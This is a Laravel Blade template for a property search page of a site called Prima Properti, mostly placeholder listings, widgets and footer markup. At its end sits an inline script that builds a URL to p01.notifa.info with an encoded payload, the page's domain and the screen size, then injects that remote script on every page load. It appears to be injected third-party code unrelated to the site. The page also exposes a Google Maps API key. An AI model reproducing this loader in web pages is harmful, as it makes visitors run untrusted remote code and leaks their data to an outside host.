<!DOCTYPE html>
<html lang="en" id="home">
  <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Prima Properti</title>

    <!-- Bootstrap -->
    <link href="{{asset('assets/css/bootstrap.min.css')}}" rel="stylesheet">
     
    <!-- External Css -->
    <link rel="stylesheet" href="{{asset('assets/css/fontawesome-all.min.css')}}">
    <link rel="stylesheet" href="{{asset('assets/css/themify-icons.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/et-line.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/owl.carousel.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/jquery.nstSlider.min.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/bootstrap-select.min.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/plyr.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/magnific-popup.css')}}" />
    <link rel="stylesheet" href="{{asset('assets/css/js-flickr-gallery.css')}}" />

    <!-- leaflet -->
    <link rel="stylesheet" href="asse{{asset('ts/leaflet/css/leaflet.css')}}">
    <link rel="stylesheet" href="asse{{asset('ts/leaflet/css/MarkerCluster.css')}}">
    <link rel="stylesheet" href="asse{{asset('ts/leaflet/css/MarkerCluster.Default.css')}}">

    <!-- Custom Css -->
    <link rel="stylesheet" type="text/css" href="{{asset('css/main.css')}}">

    <!-- Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700" rel="stylesheet">

    <!-- Favicon -->
    <link rel="icon" href="{{asset('assets/img/icon.png')}}">
  </head>
  <body>

    @include('layouts.nav')

    <!-- Subheader -->
    <div class="cpdv-subheader-bg">
      <div class="subheader">
        <div class="container">
          <div class="row">
            <div class="col-md-12">
              <div class="subheader-content">
                <ul class="breadcrumb">
                  <li><a href="#">Home</a></li>
                  <li class="active">Search Properties</li>
                </ul>
                <h3 class="subheader-title">Search Properties</h3>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <!-- Subheader End -->
    
    <!-- Search Field -->
    <div class="search-field">
      <form action="#" class="form-inline margin-balance">
        <div class="form-group">
          <input type="text" class="form-control" name="type" placeholder="Type" list="city">
          <datalist id="city">
            <option value="New Work">
            <option value="Las Vegas">
            <option value="Calefornia">
            <option value="Miami">
            <option value="Nevada">
          </datalist>
        </div>
        <div class="form-group">
          <input type="text" class="form-control" name="city" placeholder="Kota" list="city">
          <datalist id="city">
            <option value="New Work">
            <option value="Las Vegas">
            <option value="Calefornia">
            <option value="Miami">
            <option value="Nevada">
          </datalist>
        </div>
        <div class="form-group">
          <input type="text" class="form-control" name="status" placeholder="Status">
        </div>
        <div class="form-group">
          <div class="input-group">
            <div class="input-group-addon">Min</div>
            <input type="number" class="form-control" name="min_price" placeholder="RP.">
          </div>
        </div>
        <div class="form-group">
          <div class="input-group">
            <div class="input-group-addon">Max</div>
            <input type="number" class="form-control" name="max_price" placeholder="RP.">
          </div>
        </div>
        <button class="button btn btn-default">Cari!</button>
      </form>
    </div>
    <!-- Search Field End -->

    <!-- Search Properties -->
    <div class="section-padding">
      <div class="container">
        <div class="row">
          <div class="col-md-8">
            <div class="search-property-block">
              <div class="controller-block">
                <div class="catagory-area">
                  <select name="catagroies" class="search-catagries" id="search-catagries">
                    <option value="Default Catagory" selected>Default Catagory</option>
                    <option value="Default Catagory">Default Catagory 1</option>
                    <option value="Default Catagory">Default Catagory 2</option>
                    <option value="Default Catagory">Default Catagory 3</option>
                  </select>
                </div>
                <div class="style-controllder-area">
                  <div class="controller grid">
                    <i class="fas fa-th"></i>
                  </div>
                  <div class="controller active list">
                    <i class="fas fa-list"></i>
                  </div>
                </div>
              </div>
              <div class="row search-property margin-balance">
                <div class="column col-xs-12">
                  <div class="listing">
                    <div class="listing-thumb">
                      <div class="listing-slider">
                        <div class="slide slide-1">
                          <img src="{{asset('images/listing/listing-slide-1.jpg')}}" class="img-responsive" alt="">
                        </div>
                        <div class="slide slide-2">
                          <img src="{{asset('images/listing/listing-slide-2.jpg')}}" class="img-responsive" alt="">
                        </div>
                        <div class="slide slide-3">
                          <img src="{{asset('images/listing/listing-slide-3.jpg')}}" class="img-responsive" alt="">
                        </div>
                      </div>
                      <div class="overlay"></div>
                      <div class="quick-action">
                        <ul>
                          <li><a href="#"><i class="fas fa-exchange-alt"></i></a></li>
                          <li><a href="#"><i class="far fa-heart"></i></a></li>
                        </ul>
                      </div>
                      <div class="rate">
                        <span>&#36;22,500.00</span>
                      </div>
                    </div>
                    <div class="content-block">
                      <div class="listing-body">
                        <h5><a href="#">Olivers Kitchen</a> <span class="badge sale">Sale</span></h5>
                        <div class="meta">
                          <span class="listing-type">living room</span>
                          <span class="listing-status open">Open</span>
                        </div>
                        <span class="address"><i class="fas fa-map-marker-alt"></i> 187, Madison Squre, New York, NY2154215</span>
                        <div class="info">
                          <div class="listing-info bedroom">
                            <span class="title">Bedrooms</span>
                            <span class="number">05</span>
                          </div>
                          <div class="listing-info bath">
                            <span class="title">Baths</span>
                            <span class="number">05</span>
                          </div>
                          <div class="listing-info size">
                            <span class="title">Size (Sq.ft)</span>
                            <span class="number">1650</span>
                          </div>
                        </div>
                      </div>
                      <div class="author">
                        <div class="author-thumb">
                          <a href="#"><img src="{{asset('images/listing/author-thumb-1.jpg')}}" class="img-responsive" alt=""></a>
                        </div>
                        <div class="author-info">
                          <h6><a href="#">Maria Marlin</a></h6>
                          <span class="listing-date"><i class="far fa-clock"></i> 12 December 2018</span>
                          <a href="#"><i class="fas fa-long-arrow-alt-right"></i></a>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="column col-xs-12">
                  <div class="listing">
                    <div class="listing-thumb">
                      <div class="listing-slider">
                        <div class="slide slide-1">
                          <img src="{{asset('images/listing/listing-slide-1.jpg')}}" class="img-responsive" alt="">
                        </div>
                        <div class="slide slide-2">
                          <img src="{{asset('images/listing/listing-slide-2.jpg')}}" class="img-responsive" alt="">
                        </div>
                        <div class="slide slide-3">
                          <img src="{{asset('images/listing/listing-slide-3.jpg')}}" class="img-responsive" alt="">
                        </div>
                      </div>
                      <div class="overlay"></div>
                      <div class="quick-action">
                        <ul>
                          <li><a href="#"><i class="fas fa-exchange-alt"></i></a></li>
                          <li><a href="#"><i class="far fa-heart"></i></a></li>
                        </ul>
                      </div>
                      <div class="rate">
                        <span>&#36;22,500.00</span>
                      </div>
                    </div>
                    <div class="content-block">
                      <div class="listing-body">
                        <h5><a href="#">Olivers Kitchen</a> <span class="badge sale">Sale</span></h5>
                        <div class="meta">
                          <span class="listing-type">living room</span>
                          <span class="listing-status open">Open</span>
                        </div>
                        <span class="address"><i class="fas fa-map-marker-alt"></i> 187, Madison Squre, New York, NY2154215</span>
                        <div class="info">
                          <div class="listing-info bedroom">
                            <span class="title">Bedrooms</span>
                            <span class="number">05</span>
                          </div>
                          <div class="listing-info bath">
                            <span class="title">Baths</span>
                            <span class="number">05</span>
                          </div>
                          <div class="listing-info size">
                            <span class="title">Size (Sq.ft)</span>
                            <span class="number">1650</span>
                          </div>
                        </div>
                      </div>
                      <div class="author">
                        <div class="author-thumb">
                          <a href="#"><img src="{{asset('images/listing/author-thumb-1.jpg')}}" class="img-responsive" alt=""></a>
                        </div>
                        <div class="author-info">
                          <h6><a href="#">Maria Marlin</a></h6>
                          <span class="listing-date"><i class="far fa-clock"></i> 12 December 2018</span>
                          <a href="#"><i class="fas fa-long-arrow-alt-right"></i></a>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="column col-xs-12">
                  <div class="listing">
                    <div class="listing-thumb">
                      <div class="listing-slider">
                        <div class="slide slide-1">
                          <img src="{{asset('images/listing/listing-slide-1.jpg')}}" class="img-responsive" alt="">
                        </div>
                        <div class="slide slide-2">
                          <img src="{{asset('images/listing/listing-slide-2.jpg')}}" class="img-responsive" alt="">
                        </div>
                        <div class="slide slide-3">
                          <img src="{{asset('images/listing/listing-slide-3.jpg')}}" class="img-responsive" alt="">
                        </div>
                      </div>
                      <div class="overlay"></div>
                      <div class="quick-action">
                        <ul>
                          <li><a href="#"><i class="fas fa-exchange-alt"></i></a></li>
                          <li><a href="#"><i class="far fa-heart"></i></a></li>
                        </ul>
                      </div>
                      <div class="rate">
                        <span>&#36;22,500.00</span>
                      </div>
                    </div>
                    <div class="content-block">
                      <div class="listing-body">
                        <h5><a href="#">Olivers Kitchen</a> <span class="badge sale">Sale</span></h5>
                        <div class="meta">
                          <span class="listing-type">living room</span>
                          <span class="listing-status open">Open</span>
                        </div>
                        <span class="address"><i class="fas fa-map-marker-alt"></i> 187, Madison Squre, New York, NY2154215</span>
                        <div class="info">
                          <div class="listing-info bedroom">
                            <span class="title">Bedrooms</span>
                            <span class="number">05</span>
                          </div>
                          <div class="listing-info bath">
                            <span class="title">Baths</span>
                            <span class="number">05</span>
                          </div>
                          <div class="listing-info size">
                            <span class="title">Size (Sq.ft)</span>
                            <span class="number">1650</span>
                          </div>
                        </div>
                      </div>
                      <div class="author">
                        <div class="author-thumb">
                          <a href="#"><img src="{{asset('images/listing/author-thumb-1.jpg')}}" class="img-responsive" alt=""></a>
                        </div>
                        <div class="author-info">
                          <h6><a href="#">Maria Marlin</a></h6>
                          <span class="listing-date"><i class="far fa-clock"></i> 12 December 2018</span>
                          <a href="#"><i class="fas fa-long-arrow-alt-right"></i></a>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="column col-xs-12">
                  <div class="listing">
                    <div class="listing-thumb">
                      <div class="listing-slider">
                        <div class="slide slide-1">
                          <img src="{{asset('images/listing/listing-slide-1.jpg')}}" class="img-responsive" alt="">
                        </div>
                        <div class="slide slide-2">
                          <img src="{{asset('images/listing/listing-slide-2.jpg')}}" class="img-responsive" alt="">
                        </div>
                        <div class="slide slide-3">
                          <img src="{{asset('images/listing/listing-slide-3.jpg')}}" class="img-responsive" alt="">
                        </div>
                      </div>
                      <div class="overlay"></div>
                      <div class="quick-action">
                        <ul>
                          <li><a href="#"><i class="fas fa-exchange-alt"></i></a></li>
                          <li><a href="#"><i class="far fa-heart"></i></a></li>
                        </ul>
                      </div>
                      <div class="rate">
                        <span>&#36;22,500.00</span>
                      </div>
                    </div>
                    <div class="content-block">
                      <div class="listing-body">
                        <h5><a href="#">Olivers Kitchen</a> <span class="badge sale">Sale</span></h5>
                        <div class="meta">
                          <span class="listing-type">living room</span>
                          <span class="listing-status open">Open</span>
                        </div>
                        <span class="address"><i class="fas fa-map-marker-alt"></i> 187, Madison Squre, New York, NY2154215</span>
                        <div class="info">
                          <div class="listing-info bedroom">
                            <span class="title">Bedrooms</span>
                            <span class="number">05</span>
                          </div>
                          <div class="listing-info bath">
                            <span class="title">Baths</span>
                            <span class="number">05</span>
                          </div>
                          <div class="listing-info size">
                            <span class="title">Size (Sq.ft)</span>
                            <span class="number">1650</span>
                          </div>
                        </div>
                      </div>
                      <div class="author">
                        <div class="author-thumb">
                          <a href="#"><img src="{{asset('images/listing/author-thumb-1.jpg')}}" class="img-responsive" alt=""></a>
                        </div>
                        <div class="author-info">
                          <h6><a href="#">Maria Marlin</a></h6>
                          <span class="listing-date"><i class="far fa-clock"></i> 12 December 2018</span>
                          <a href="#"><i class="fas fa-long-arrow-alt-right"></i></a>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="column col-xs-12">
                  <div class="listing">
                    <div class="listing-thumb">
                      <div class="listing-slider">
                        <div class="slide slide-1">
                          <img src="{{asset('images/listing/listing-slide-1.jpg')}}" class="img-responsive" alt="">
                        </div>
                        <div class="slide slide-2">
                          <img src="{{asset('images/listing/listing-slide-2.jpg')}}" class="img-responsive" alt="">
                        </div>
                        <div class="slide slide-3">
                          <img src="{{asset('images/listing/listing-slide-3.jpg')}}" class="img-responsive" alt="">
                        </div>
                      </div>
                      <div class="overlay"></div>
                      <div class="quick-action">
                        <ul>
                          <li><a href="#"><i class="fas fa-exchange-alt"></i></a></li>
                          <li><a href="#"><i class="far fa-heart"></i></a></li>
                        </ul>
                      </div>
                      <div class="rate">
                        <span>&#36;22,500.00</span>
                      </div>
                    </div>
                    <div class="content-block">
                      <div class="listing-body">
                        <h5><a href="#">Olivers Kitchen</a> <span class="badge sale">Sale</span></h5>
                        <div class="meta">
                          <span class="listing-type">living room</span>
                          <span class="listing-status open">Open</span>
                        </div>
                        <span class="address"><i class="fas fa-map-marker-alt"></i> 187, Madison Squre, New York, NY2154215</span>
                        <div class="info">
                          <div class="listing-info bedroom">
                            <span class="title">Bedrooms</span>
                            <span class="number">05</span>
                          </div>
                          <div class="listing-info bath">
                            <span class="title">Baths</span>
                            <span class="number">05</span>
                          </div>
                          <div class="listing-info size">
                            <span class="title">Size (Sq.ft)</span>
                            <span class="number">1650</span>
                          </div>
                        </div>
                      </div>
                      <div class="author">
                        <div class="author-thumb">
                          <a href="#"><img src="{{asset('images/listing/author-thumb-1.jpg')}}" class="img-responsive" alt=""></a>
                        </div>
                        <div class="author-info">
                          <h6><a href="#">Maria Marlin</a></h6>
                          <span class="listing-date"><i class="far fa-clock"></i> 12 December 2018</span>
                          <a href="#"><i class="fas fa-long-arrow-alt-right"></i></a>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                <div class="column col-xs-12">
                  <div class="listing">
                    <div class="listing-thumb">
                      <div class="listing-slider">
                        <div class="slide slide-1">
                          <img src="{{asset('images/listing/listing-slide-1.jpg')}}" class="img-responsive" alt="">
                        </div>
                        <div class="slide slide-2">
                          <img src="{{asset('images/listing/listing-slide-2.jpg')}}" class="img-responsive" alt="">
                        </div>
                        <div class="slide slide-3">
                          <img src="{{asset('images/listing/listing-slide-3.jpg')}}" class="img-responsive" alt="">
                        </div>
                      </div>
                      <div class="overlay"></div>
                      <div class="quick-action">
                        <ul>
                          <li><a href="#"><i class="fas fa-exchange-alt"></i></a></li>
                          <li><a href="#"><i class="far fa-heart"></i></a></li>
                        </ul>
                      </div>
                      <div class="rate">
                        <span>&#36;22,500.00</span>
                      </div>
                    </div>
                    <div class="content-block">
                      <div class="listing-body">
                        <h5><a href="#">Olivers Kitchen</a> <span class="badge sale">Sale</span></h5>
                        <div class="meta">
                          <span class="listing-type">living room</span>
                          <span class="listing-status open">Open</span>
                        </div>
                        <span class="address"><i class="fas fa-map-marker-alt"></i> 187, Madison Squre, New York, NY2154215</span>
                        <div class="info">
                          <div class="listing-info bedroom">
                            <span class="title">Bedrooms</span>
                            <span class="number">05</span>
                          </div>
                          <div class="listing-info bath">
                            <span class="title">Baths</span>
                            <span class="number">05</span>
                          </div>
                          <div class="listing-info size">
                            <span class="title">Size (Sq.ft)</span>
                            <span class="number">1650</span>
                          </div>
                        </div>
                      </div>
                      <div class="author">
                        <div class="author-thumb">
                          <a href="#"><img src="{{asset('images/listing/author-thumb-1.jpg')}}" class="img-responsive" alt=""></a>
                        </div>
                        <div class="author-info">
                          <h6><a href="#">Maria Marlin</a></h6>
                          <span class="listing-date"><i class="far fa-clock"></i> 12 December 2018</span>
                          <a href="#"><i class="fas fa-long-arrow-alt-right"></i></a>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              <div class="row">
                <div class="col-xs-12">
                  <div class="pagination-list section-padding-top-50">
                    <nav class="navigation pagination">
                      <div class="nav-links">
                        <a class="prev page-numbers" href="#"><i class="fas fa-angle-left"></i></a>
                        <a class="page-numbers" href="#">1</a>
                        <span aria-current="page" class="page-numbers current">2</span>
                        <a class="page-numbers" href="#">3</a>
                        <a class="page-numbers" href="#">4</a>
                        <a class="next page-numbers" href="#"><i class="fas fa-angle-right"></i></a>
                      </div>
                    </nav>                
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="col-md-4">
            <div class="sidebar">
              <aside class="widget widget-latest-listing">
                <h6>Latest Listings</h6>
                <div class="latest-listings">
                  <div class="latest-listing">
                    <div class="listing-thumb">
                      <a href="#">
                        <img src="{{asset('images/widget/latest-listing-1.jpg')}}" class="img-responsive" alt="">
                      </a>
                    </div>
                    <div class="listing-body">
                      <p class="title"><a href="#">Hotel in Madison Square</a></p>
                      <p class="cost">$1255.00 / Months</p>
                    </div>
                  </div>
                  <div class="latest-listing">
                    <div class="listing-thumb">
                      <a href="#">
                        <img src="{{asset('images/widget/latest-listing-2.jpg')}}" class="img-responsive" alt="">
                      </a>
                    </div>
                    <div class="listing-body">
                      <p class="title"><a href="#">Hotel in Madison Square</a></p>
                      <p class="cost">$1255.00 / Months</p>
                    </div>
                  </div>
                  <div class="latest-listing">
                    <div class="listing-thumb">
                      <a href="#">
                        <img src="{{asset('images/widget/latest-listing-3.jpg')}}" class="img-responsive" alt="">
                      </a>
                    </div>
                    <div class="listing-body">
                      <p class="title"><a href="#">Hotel in Madison Square</a></p>
                      <p class="cost">$1255.00 / Months</p>
                    </div>
                  </div>
                  <div class="latest-listing">
                    <div class="listing-thumb">
                      <a href="#">
                        <img src="{{asset('images/widget/latest-listing-4.jpg')}}" class="img-responsive" alt="">
                      </a>
                    </div>
                    <div class="listing-body">
                      <p class="title"><a href="#">Hotel in Madison Square</a></p>
                      <p class="cost">$1255.00 / Months</p>
                    </div>
                  </div>
                </div>
              </aside>
              <aside class="widget widget-video">
                <h6>Video Description</h6>
                <div class="widget-video-area">
                  <div data-type="vimeo" data-video-id="54275813"></div>
                </div>
              </aside>
              <aside class="widget widget-accordion">
                <h6>General FAQs</h6>
                <div class="accordion-default">
                  <div class="panel-group" id="accordion-box-success" role="tablist" aria-multiselectable="true">
                    <div class="panel panel-default">
                      <div class="panel-heading block-style" role="tab" id="heading33">
                        <p class="panel-title">
                        <a role="button" data-toggle="collapse" data-parent="#accordion-box-success" href="#collapse33" aria-expanded="true" aria-controls="collapse33">
                          How to Purchase this Property?
                        </a>
                        </p>
                      </div>
                      <div id="collapse33" class="panel-collapse collapse in" role="tabpanel" aria-labelledby="heading33">
                        <div class="panel-body">
                          <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore</p> 
                        </div>
                      </div>
                    </div>
                    <div class="panel panel-default">
                      <div class="panel-heading style-none" role="tab" id="heading34">
                        <p class="panel-title">
                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion-box-success" href="#collapse34" aria-expanded="false" aria-controls="collapse34">
                          How to Purchase this Property?
                        </a>
                        </p>
                      </div>
                      <div id="collapse34" class="panel-collapse collapse" role="tabpanel" aria-labelledby="heading34">
                        <div class="panel-body">
                          <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore</p> 
                        </div>
                      </div>
                    </div>
                    <div class="panel panel-default">
                      <div class="panel-heading style-none" role="tab" id="heading35">
                        <p class="panel-title">
                        <a class="collapsed" role="button" data-toggle="collapse" data-parent="#accordion-box-success" href="#collapse35" aria-expanded="false" aria-controls="collapse35">
                          How to Purchase this Property?
                        </a>
                        </p>
                      </div>
                      <div id="collapse35" class="panel-collapse collapse" role="tabpanel" aria-labelledby="heading35">
                        <div class="panel-body">
                          <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore</p> 
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </aside>
              <aside class="widget widget-social">
                <h6>Share on Social</h6>
                <ul class="widget-social-share">
                  <li><a href="#" class="facebook"><i class="fab fa-facebook-f"></i></a></li>
                  <li><a href="#" class="twitter"><i class="fab fa-twitter"></i></a></li>
                  <li><a href="#" class="google"><i class="fab fa-google-plus-g"></i></a></li>
                  <li><a href="#" class="linkedin"><i class="fab fa-linkedin-in"></i></a></li>
                </ul>
              </aside>
            </div>
          </div>
        </div>
      </div>
    </div>
    <!-- Search Properties End -->

    <!-- Call to Action -->
    <div class="cpdv-container primary-bg section-padding-50">
      <div class="container">
        <div class="row">
          <div class="col-lg-7 col-md-6">
            <div class="left-content">
              <div class="call-to-action-content">
                <h3>Subscribe Today!</h3>
                <p>Don’t miss our future updates. Get Subscribe today to getting Updates!</p>
              </div>
            </div>
          </div>
          <div class="col-lg-5 col-md-6">
            <div class="right-content-sm">
              <div class="call-to-action-form">
                <form class="subscription-form" action="#" method="post">
                  <input type="text" placeholder="Enter your mail here">
                  <button class="button white-bg">Subscribe</button>
				  <p class="newsletter-success"></p>
				  <p class="newsletter-error"></p>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <!-- Call to Action End -->

    <!-- Footer -->
    <footer>
      <div class="footer-widget-area section-padding">
        <div class="container">
          <div class="row margin-balance">
            <div class="col-md-4 col-md-offset-1 col-sm-6">
              <aside class="widget footer-get-in-touch-widget">
                <h6 class="widget-title">Prima Properti</h6>
                <p><span class="title">Alamat</span><span class="contact-info">Jln. Letnan Sudiono Bondowoso</p>
                <p><span class="title">Telepon</span><span class="contact-info">0823-3512-7064</span></p>
                <p><span class="title">Email</span><span class="contact-info">support@primaproperti.com</span></p>
              </aside>
            </div>
            <div class="col-md-4 col-sm-6">
              <aside class="widget footer-listing-widget">
                <h6 class="widget-title">Properti Terbaru</h6>
                <div class="footer-listings">
                  <div class="footer-listing">
                    <div class="listing-thumb">
                      <a href="#">
                        <img src="{{asset('images/listing/footer-listing-1.jpg')}}" class="img-responsive" alt="">
                      </a>
                    </div>
                    <div class="body">
                      <p class="title"><a href="#">Hotel in Madison Square</a></p>
                      <p class="cost">$1255.00 / Months</p>
                    </div>
                  </div>
                  <div class="footer-listing">
                    <div class="listing-thumb">
                      <a href="#">
                        <img src="{{asset('images/listing/footer-listing-1.jpg')}}" class="img-responsive" alt="">
                      </a>
                    </div>
                    <div class="body">
                      <p class="title"><a href="#">Hotel in Madison Square</a></p>
                      <p class="cost">$1255.00 / Months</p>
                    </div>
                  </div>
                </div>
              </aside>
            </div>
            <div class="col-md-2 col-sm-4">
              <aside class="widget widget-useful-link">
                <h6 class="widget-title">Informasi</h6>
                <ul class="links">
                  <li><a href="#">How to Purchase</a></li>
                  <li><a href="#">Tips &amp; Tricks</a></li>
                  <li><a href="#">Privacy Policy</a></li>
                  <li><a href="#">Legal / Law</a></li>
                </ul>
              </aside>
            </div>
          </div>
        </div>
      </div>
      <div class="grey-bg section-padding-50">
        <div class="container">
          <div class="row">
            <div class="col-md-4 col-md-offset-4">
              <div class="footer-social-link">
                <div class="footer-logo">
                  <a href="#">
                    <img src="{{asset('assets/img/properti.png')}}" class="img-responsive" alt="Footer Logo" style="width: 100px; height: auto;">
                  </a>
                </div>
                <div class="social-link">
                  <ul>
                    <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
                    <li><a href="#"><i class="fab fa-twitter"></i></a></li>
                    <li><a href="#"><i class="fab fa-google-plus-g"></i></a></li>
                    <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
                    <li><a href="#"><i class="fab fa-youtube"></i></a></li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="copyright primary-bg">
        <div class="container">
          <div class="row">
            <div class="col-md-6 col-md-push-6">
              <div class="footer-nav" id="footer-nav">
                <ul>
                  <li class="submenu">
                    <a href="#">Legal</a>
                    <ul class="submenu-item">
                      <li><a href="#">Dropdown 1</a></li>
                      <li><a href="#">Dropdown 2</a></li>
                      <li><a href="#">Dropdown 3</a></li>
                      <li class="submenu">
                        <a href="#">Dropdown 4</a>
                        <ul class="submenu-item">
                          <li><a href="#">Dropdown 1</a></li>
                          <li><a href="#">Dropdown 2</a></li>
                          <li><a href="#">Dropdown 3</a></li>
                          <li class="submenu">
                            <a href="#">Dropdown 4</a>
                            <ul class="submenu-item">
                              <li><a href="#">Dropdown 1</a></li>
                              <li><a href="#">Dropdown 2</a></li>
                              <li><a href="#">Dropdown 3</a></li>
                              <li class="submenu">
                                <a href="#">Dropdown 4</a>
                                <ul class="submenu-item">
                                  <li><a href="#">Dropdown 1</a></li>
                                  <li><a href="#">Dropdown 2</a></li>
                                  <li><a href="#">Dropdown 3</a></li>
                                  <li class="submenu">
                                    <a href="#">Dropdown 4</a>
                                    <ul class="submenu-item">
                                      <li><a href="#">Dropdown 1</a></li>
                                      <li><a href="#">Dropdown 2</a></li>
                                      <li><a href="#">Dropdown 3</a></li>
                                    </ul>
                                  </li>
                                </ul>
                              </li>
                            </ul>
                          </li>
                        </ul>
                      </li>
                    </ul>
                  </li>
                  <li><a href="#">Terms &amp; Conditions </a></li>
                  <li><a href="#">Legal</a></li>
                  <li><a href="#">Privacy Policy</a></li>
                </ul>
              </div>
            </div>
            <div class="col-md-6 col-md-pull-6">
              <p class="copyright-text">Copyright 2019, <a href="#">Prima Properti. </a> All Rights Reserved</p>
            </div>
          </div>
        </div>
      </div>
    </footer>
    <!-- Footer End -->

    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="{{asset('assets/js/jquery.min.js')}}"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
    <script src="{{asset('assets/js/visible.js')}}"></script>
    <script src="{{asset('assets/js/owl.carousel.min.js')}}"></script>
    <script src="{{asset('assets/js/jquery.nstSlider.min.js')}}"></script>
    <script src="{{asset('assets/js/bootstrap-select.min.js')}}"></script>
    <script src="{{asset('assets/js/plyr.js')}}"></script>
    <script src="{{asset('assets/js/jquery-migrate-3.0.1.js')}}"></script>
    <script src="{{asset('assets/js/jquery.magnific-popup.min.js')}}"></script>
    <script src="{{asset('assets/js/js-flickr-gallery.js')}}"></script>
    <script src="{{asset('assets/js/tinymce.min.js')}}"></script>
    <script src="{{asset('assets/js/isotope.pkgd.min.js')}}"></script>
    <script src="{{asset('assets/js/imagesloaded.pkgd.min.js')}}"></script>
    <script src="{{asset('assets/js/jquery.ajaxchimp.min.js')}}"></script>

    <!-- leaflet -->
    <script src="{{asset('assets/leaflet/js/dummylatlng.js')}}"></script>
    <script src="{{asset('assets/leaflet/js/leaflet-src.js')}}"></script>
    <script src="{{asset('assetts/leaflet/js/leaflet.markercluster-src.js')}}"></script>

    <script src="{{asset('js/custom.js')}}"></script>
    <script src="{{asset('js/dashboard.js')}}"></script>
    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAmiJjq5DIg_K9fv6RE72OY__p9jz0YTMI"></script>
    <script src="{{asset('js/map.js')}}"></script>
    <script src="{{asset('js/searchMap.js')}}"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH21UyEHQgB6pKDg3PqvkzNXAOm4wikTrlCrC%2feMOxffLd3n5o2xx6wIa3Kj8We0h1sbSMJGLXFWVrC2jxf7d5foR3pSwSo8%2fGGWKgMFs%2fe1t%2frseAKYxMhn5XzBpwBry4AXbr5Gyy2tJJiPGfMRknyB3VKdNWWyrSgU7bwPWdFmJqiyrIM7k8Tdj4hToLgOSy9zd%2fML8Dgz%2bL0rNd4XynGI6GtSzzB8Wgzux0rJShyVp2ZK3it4nqm%2f4vv%2b8QlwT%2f39zF%2b%2fxUZv34Qi6E1jBH%2b1%2bW%2bNkh%2fe9AJC7UbPpdGITJ0NoyqdpUi%2f1O4%2bdD6cDtga0Qp9GTZ%2fgyMXPHjepmF4h1kRJvzUnyg8WyUmcm1XGRuXOC2hsuEfP9WJzQCTRjTB5BFlUe5rUp29tADLly8eBSYz3BevckXZPw4qxX1sa%2bcR2le71c64Mn8y7cx22PanFLkOhTxHoVPnKokb0x%2biIQF8%2fA3hRUqZPLc800k%2beAYpX6Zfn8unawBJOLOfwXP" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from eorrangeshop.com/html/divinevillas/property-search.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 21 Feb 2019 04:12:27 GMT -->
</html>
